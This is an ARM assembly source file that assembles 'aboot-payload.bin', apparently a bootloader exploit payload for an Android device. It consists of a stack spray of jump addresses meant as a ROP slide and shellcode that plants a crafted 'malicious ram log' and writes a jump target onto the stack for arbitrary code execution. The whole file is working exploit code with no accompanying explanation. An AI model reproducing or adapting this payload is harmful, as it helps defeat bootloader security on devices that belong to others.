.nds

.create "aboot-payload.bin",0x0

.include "aboot_gadgets.s"

STACK_START_ADDR equ (0x8f6dabd8)
JUMP_ADDR equ (payload_final)

.headersize STACK_START_ADDR


.org STACK_START_ADDR

    ; In the event that we're off by a factor of 4 or so,
    ; hopefully we'll slide into the ROP fine
    .word JUMP_ADDR
    .word JUMP_ADDR
    .word JUMP_ADDR
    .word JUMP_ADDR
    
    .word JUMP_ADDR
    .word JUMP_ADDR
    .word JUMP_ADDR
    .word JUMP_ADDR
    
    .word JUMP_ADDR
    .word JUMP_ADDR
    .word JUMP_ADDR
    .word JUMP_ADDR

    .word JUMP_ADDR
    .word JUMP_ADDR
    .word JUMP_ADDR
    .word JUMP_ADDR
    
    .word JUMP_ADDR
    .word JUMP_ADDR
    .word JUMP_ADDR
    .word JUMP_ADDR
    
    .word JUMP_ADDR
    .word JUMP_ADDR
    .word JUMP_ADDR
    .word JUMP_ADDR

rop:
    .word JUMP_ADDR
    .word JUMP_ADDR
    .word JUMP_ADDR
    .word JUMP_ADDR
    .word JUMP_ADDR
    .word JUMP_ADDR
    .word JUMP_ADDR
    
    ; END OF ROP!!
    .word 0xDEADB00F

RAMLOG_BASE equ (0xA8100000)
SHIFT equ (0x100000000 + (0x0805BD00 - RAMLOG_BASE))
DST_ARB equ (0x100000000 + 0x100000-0x10-SHIFT)
RAMCONSOLE_MAGIC equ (0x43474244)
FB_ADDR equ (0x90000000)

.arm
.align 0x10
payload_final:
    nop
    nop
    nop
    nop
    nop
    ldr r0, =stack_move
    mov sp, r0
    
    
    
    ldr r7, =SHIFT
    ldr r8, =DST_ARB
    ldr r9, =RAMLOG_BASE ; this is an arbitrary piece of memory to hold our malicious "ram log"
    
    str r8, [r8, #0x4]
    ldr r0, =(0x080399DA + 1) ; this is our jump location which gets written to the stack
    str r0, [r8, #0x40]
    
    ldr r0, =RAMCONSOLE_MAGIC
    str r0, [r9]
    
    ldr r1, =0x08600000
    str r9, [r1, #0x40]
    str r7, [r1, #0x44]
    
    ldr r0, =FB_ADDR
    str r0, [r1, #0x48]

    .word 0xFFFFFFFF

    b .

.pool

test_str:
.ascii "My string"
.byte 0

.org STACK_START_ADDR+0x194F
.byte 0x0
stack_move:

.close


